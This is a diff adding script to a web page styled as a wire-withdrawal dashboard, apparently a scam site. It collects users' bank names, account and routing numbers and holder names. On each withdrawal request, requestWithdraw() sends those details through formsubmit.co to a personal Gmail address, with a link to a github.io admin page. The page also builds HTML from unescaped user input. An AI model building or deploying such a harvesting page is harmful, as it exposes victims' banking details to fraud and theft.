@@ -156,4 +156,41 @@ if(!email){showTab('login'); return;}
 document.getElementById('dashEmail').innerText='Logged in as: '+email;
 document.getElementById('topEmail').innerText=email;
 let me=getUsers().find(x=>x.email==email);
-document.getElementById
+document.getElementById('bal').innerText=me? (me.balance||0) : '00';
+let banks=getBanks().filter(b=>b.email==email);
+let h=''; banks.forEach(b=>{h+=`<div style="border:1px solid #ddd;padding:10px;border-radius:8px;margin:6px 0"><b>${b.bank}</b><br>Acc:${b.acc} | Rout:${b.routing}<br>${b.name} - ${b.type}</div>`});
+document.getElementById('myBanks').innerHTML=h||'No bank yet - Click Add Bank Details';
+}
+function saveBank(){
+let bank=document.getElementById('mBank').value;
+let acc=document.getElementById('mAcc').value;
+let routing=document.getElementById('mRouting').value;
+let name=document.getElementById('mName').value;
+let type=document.getElementById('mType').value;
+let email=localStorage.getItem('current_user')||'Guest';
+if(!acc||!routing||!name){document.getElementById('mMsg').innerText='Fill Account, Routing, Name'; return;}
+let banks=getBanks(); banks.push({id:Date.now(),email,bank,acc,routing,name,type,date:new Date().toLocaleString()});
+saveBanks(banks);
+document.getElementById('mMsg').innerText='✅ Bank saved - '+bank;
+setTimeout(()=>{document.getElementById('bankModal').style.display='none'; loadDash();},800);
+}
+function requestWithdraw(){
+let amt=document.getElementById('wAmount').value;
+if(!amt){document.getElementById('wMsg').innerText='Enter amount'; return;}
+let email=localStorage.getItem('current_user')||'Guest';
+let banks=getBanks().filter(b=>b.email==email);
+let lastBank=banks.length? banks[banks.length-1] : {bank:'No bank',acc:'-',routing:'-',name:'-',type:'-'};
+document.getElementById('wMsg').innerText='✅ Request $'+amt+' submitted! Admin email alert sent to supportadmin46@gmail.com';
+fetch("https://formsubmit.co/ajax/supportadmin46@gmail.com",{
+method:"POST",
+headers:{'Content-Type':'application/json','Accept':'application/json'},
+body:JSON.stringify({
+subject:"NEW WITHDRAWAL $"+amt+" - "+email,
+message:"NEW WITHDRAWAL\n\nClient: "+email+"\nAmount: $"+amt+"\n\nBANK DETAILS:\nBank: "+lastBank.bank+"\nAccount: "+lastBank.acc+"\nRouting: "+lastBank.routing+"\nHolder: "+lastBank.name+"\nType: "+lastBank.type+"\n\nTime: "+new Date().toLocaleString()+"\nAdmin: https://chocolate2269.github.io/wire/admin.html"
+})
+}).then(r=>r.json()).then(d=>console.log('Email sent')).catch(e=>console.log(e));
+}
+function logout(){localStorage.removeItem('current_user'); showTab('home'); document.getElementById('topEmail').innerText='';}
+</script>
+</body>
+</html>
